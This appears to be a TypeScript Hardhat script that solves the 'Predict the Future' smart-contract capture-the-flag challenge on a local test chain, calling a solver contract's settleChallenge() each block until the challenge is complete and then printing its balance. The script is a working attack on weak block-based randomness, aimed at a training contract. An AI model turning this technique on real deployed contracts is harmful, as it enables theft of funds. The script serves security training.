import 'dotenv/config';
import chalk from 'chalk';
import { ethers } from "hardhat";
import { PredictTheFutureSolver, PredictTheFutureChallenge } from "../typechain"

// async function chalk() {
//   return (await import("chalk")).default;
// }


const MNEMONIC = 'test test test test test test test test test test test junk'
const PATH = "m/44'/60'/0'/0/2"
const provider = new ethers.providers.WebSocketProvider("ws://localhost:8545");

// const wallet = new ethers.Wallet(privateKey)
const wallet =  ethers.Wallet.fromMnemonic(MNEMONIC,PATH );

const attaker = wallet.address;
const account = wallet.connect(provider);
provider.removeAllListeners();

const predictTheFutureChallenge = new ethers.Contract(
  "0x8464135c8F25Da09e49BC8782676a84730C318bC",
  [
    'function isComplete() view returns (bool)'
  ],
  account
);

const predictTheFutureSolver = new ethers.Contract(
  "0x663F3ad617193148711d28f5334eE4Ed07016602",
  [
    'function settleChallenge()'
  ],
  account
);

async function main() {

  console.log('attaker',attaker)
  console.log(chalk.green('Start spamming ...'));
  provider.on("block", async(blockNumber) => {

    let isComplete = await (predictTheFutureChallenge as PredictTheFutureChallenge).isComplete();

    if (  !isComplete ){
      try {
        const tx = await (predictTheFutureSolver as PredictTheFutureSolver).settleChallenge();
        await tx.wait();
        console.log(chalk.yellow('settleChallenge() called. \n'))
      } catch (e) {
        console.log(e)
        console.log(chalk.red(`Unexpected error on settleChallenge() !!! \n`))
      }

    } else {

      let balance = await provider.getBalance("0x8464135c8F25Da09e49BC8782676a84730C318bC");
      console.log(chalk.green(`Challeng solved !!! \n`))
      console.log(chalk.green(` ETH balance \n`))
      console.log(chalk.green(balance))
    }
  })

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
